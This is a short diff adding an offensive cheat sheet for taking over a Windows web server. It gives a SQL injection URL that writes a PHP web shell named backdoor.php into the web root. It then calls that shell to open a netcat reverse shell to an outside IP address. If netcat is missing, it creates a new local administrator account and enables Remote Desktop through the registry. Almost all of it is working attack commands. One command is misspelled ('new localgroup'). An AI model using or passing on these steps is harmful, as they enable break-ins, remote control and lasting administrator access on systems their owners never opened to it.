@@ -1,0 +1,19 @@
+1.
+http://~~~~/~.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+2.
+
+http://~~~~~~/backdoor.php?cmd=nc -nv 10.11.0.73 53 -e cmd.exe
+
+If it's windows without NC:
+
+Add user from Windows command line:
+net user /add myID myPassword
+
+new localgroup administrators myID /add
+
+You can start RDP or SSH and log in with your new name. 
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
